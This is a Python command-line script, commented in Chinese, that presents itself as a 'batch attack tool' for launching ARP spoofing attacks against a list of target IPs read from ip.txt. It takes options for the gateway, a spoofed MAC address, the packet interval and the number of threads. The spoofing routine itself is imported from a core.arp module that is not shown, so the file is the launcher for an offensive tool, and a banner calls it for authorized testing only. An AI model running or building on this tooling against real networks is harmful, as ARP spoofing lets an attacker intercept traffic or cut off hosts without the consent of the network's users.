#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TRAES 批量攻击脚本
专门用于从ip.txt文件读取目标IP进行批量ARP攻击

作者: Security Researcher
版本: 1.0.0
描述: 简化的批量攻击工具，自动读取ip.txt中的目标进行ARP攻击

使用示例:
    python batch_attack.py --gateway 192.168.1.1
    python batch_attack.py --gateway 192.168.1.1 --target-file custom_ips.txt
    python batch_attack.py --gateway 192.168.1.1 --interface eth0 --verbose

"""

import sys
import os
import argparse
import json
from pathlib import Path

# 添加src目录到Python路径
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

try:
    from colorama import init, Fore, Style
    from loguru import logger
except ImportError as e:
    print(f"缺少必要的依赖库: {e}")
    print("请运行: pip install -r requirements.txt")
    sys.exit(1)

# 初始化colorama
init(autoreset=True)

def setup_logger(log_level="INFO", log_file=None):
    """
    配置日志系统
    
    Args:
        log_level (str): 日志级别
        log_file (str): 日志文件路径
    """
    logger.remove()  # 移除默认处理器
    
    # 控制台输出
    logger.add(
        sys.stderr,
        level=log_level,
        format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> - <level>{message}</level>"
    )
    
    # 文件输出
    if log_file:
        logger.add(
            log_file,
            level=log_level,
            format="{time:YYYY-MM-DD HH:mm:ss} | {level: <8} | {name}:{function}:{line} - {message}",
            rotation="10 MB",
            retention="7 days"
        )

def load_config(config_path="config/config.json"):
    """
    加载配置文件
    
    Args:
        config_path (str): 配置文件路径
        
    Returns:
        dict: 配置字典
    """
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.info(f"配置文件加载成功: {config_path}")
        return config
    except FileNotFoundError:
        logger.warning(f"配置文件不存在: {config_path}，使用默认配置")
        return {}
    except json.JSONDecodeError as e:
        logger.error(f"配置文件格式错误: {e}")
        return {}

def print_banner():
    """
    打印程序横幅
    """
    banner = f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                    TRAES 批量攻击工具                        ║
║                  Batch Attack Tool v1.0.0                   ║
║                                                              ║
║  专门用于从ip.txt文件读取目标IP进行批量ARP攻击                ║
║  ⚠️  仅用于授权的安全测试环境                                ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def create_parser():
    """
    创建命令行参数解析器
    
    Returns:
        argparse.ArgumentParser: 参数解析器
    """
    parser = argparse.ArgumentParser(
        description="TRAES 批量攻击工具 - 专门用于从ip.txt文件进行批量ARP攻击",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  基本批量攻击:   python batch_attack.py --gateway 192.168.1.1
  指定目标文件:   python batch_attack.py --gateway 192.168.1.1 --target-file custom_ips.txt
  详细输出模式:   python batch_attack.py --gateway 192.168.1.1 --verbose
  指定网络接口:   python batch_attack.py --gateway 192.168.1.1 --interface eth0
  
注意: 本工具仅用于授权的安全测试，请确保在合法环境中使用。
        """
    )
    
    # 必需参数
    parser.add_argument('--gateway', '-g',
                       required=True,
                       help='网关IP地址（必需）')
    
    # 可选参数
    parser.add_argument('--target-file', '-f',
                       default='ip.txt',
                       help='包含目标IP地址的文件路径（默认: ip.txt）')
    
    parser.add_argument('--interface', '-i',
                       help='网络接口名称（如: eth0, wlan0）')
    
    parser.add_argument('--config', '-c',
                       default='config/config.json',
                       help='配置文件路径（默认: config/config.json）')
    
    parser.add_argument('--verbose', '-v',
                       action='store_true',
                       help='详细输出模式')
    
    parser.add_argument('--log-file',
                       help='日志文件路径')
    
    # ARP攻击参数
    arp_group = parser.add_argument_group('ARP攻击参数')
    arp_group.add_argument('--spoof-mac',
                          help='伪造的MAC地址')
    arp_group.add_argument('--interval',
                          type=float, default=1.0,
                          help='ARP包发送间隔（秒，默认: 1.0）')
    arp_group.add_argument('--threads',
                          type=int, default=5,
                          help='并发线程数（默认: 5）')
    
    return parser

def validate_target_file(file_path):
    """
    验证目标文件是否存在且有效
    
    Args:
        file_path (str): 目标文件路径
        
    Returns:
        bool: 文件是否有效
    """
    if not os.path.exists(file_path):
        logger.error(f"目标文件不存在: {file_path}")
        return False
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            if not lines:
                logger.error(f"目标文件为空或没有有效的IP地址: {file_path}")
                return False
            logger.info(f"目标文件验证成功，包含 {len(lines)} 行有效数据")
            return True
    except Exception as e:
        logger.error(f"读取目标文件时出错: {e}")
        return False

def main():
    """
    主函数
    """
    # 打印横幅
    print_banner()
    
    # 解析命令行参数
    parser = create_parser()
    args = parser.parse_args()
    
    # 设置日志
    log_level = "DEBUG" if args.verbose else "INFO"
    setup_logger(log_level, args.log_file)
    
    # 加载配置
    config = load_config(args.config)
    
    logger.info("TRAES 批量攻击工具启动")
    logger.info(f"目标文件: {args.target_file}")
    logger.info(f"网关地址: {args.gateway}")
    
    # 验证目标文件
    if not validate_target_file(args.target_file):
        logger.error("目标文件验证失败，程序退出")
        sys.exit(1)
    
    try:
        # 导入ARP攻击模块
        from core.arp import ARPAttack
        
        # 创建攻击实例
        attack = ARPAttack(config)
        
        # 设置攻击间隔
        if hasattr(attack, 'interval'):
            attack.interval = args.interval
        
        # 为兼容arp.py的run方法，添加target属性
        args.target = None
        
        logger.info("开始批量ARP攻击...")
        logger.warning("按 Ctrl+C 可以停止攻击")
        
        # 执行攻击
        attack.run(args)
        
    except ImportError as e:
        logger.error(f"模块导入失败: {e}")
        logger.error("请确保所有核心模块文件存在")
        sys.exit(1)
        
    except KeyboardInterrupt:
        logger.warning("用户中断操作")
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"程序执行出错: {e}")
        if args.verbose:
            import traceback
            logger.error(traceback.format_exc())
        sys.exit(1)
    
    logger.info("批量攻击完成")

if __name__ == '__main__':
    main()